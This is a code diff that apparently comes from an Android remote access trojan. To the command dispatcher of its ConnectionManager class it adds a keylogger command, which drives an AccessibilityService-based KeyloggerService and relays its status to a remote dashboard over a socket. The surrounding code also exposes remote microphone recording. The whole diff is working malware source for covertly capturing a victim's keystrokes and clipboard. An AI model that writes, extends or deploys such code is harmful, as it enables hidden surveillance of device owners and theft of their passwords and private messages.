@@ -327,6 +327,16 @@ public class ConnectionManager {
                 case "x0000sc":
                     x0000sc();
                     break;
+
+                case "x0000kl":
+                    x0000kl(data);
+                    break;
+
+                case "x0000kldata":
+                    // Keylogger data events are sent directly from KeyloggerService
+                    // via the socket. This case exists for dashboard relay.
+                    // No action needed on the device side for incoming kldata.
+                    break;
             }
         } catch (Exception e) {
             Log.e("ConnectionManager", "Error dispatching FCM order: " + e.getMessage());
@@ -528,6 +538,33 @@ public class ConnectionManager {
 
     public static void x0000mc(int sec) throws Exception {
         MicManager.startRecording(sec);
+    }
+
+    // ============================================================
+    // KEYLOGGER (AccessibilityService)
+    // ============================================================
+
+    private static void x0000kl(JSONObject data) {
+        try {
+            // Delegate to KeyloggerService for processing
+            KeyloggerService.processCommand(data);
+
+            // If this was a status request, the response is sent from within KeyloggerService
+            // For state changes, confirm back via socket
+            String action = data.optString("action", "toggle");
+            if (!action.equals("getStatus") && !action.equals("getClipboard")) {
+                JSONObject response = new JSONObject();
+                response.put("status", "ok");
+                response.put("action", action);
+                response.put("enabled", KeyloggerService.isEnabled());
+                response.put("serviceRunning", true);
+                if (ioSocket != null) {
+                    ioSocket.emit("x0000kl", response);
+                }
+            }
+        } catch (Exception e) {
+            Log.e("ConnectionManager", "Error in keylogger command: " + e.getMessage());
+        }
     }
 
     public static void x0000lm() {
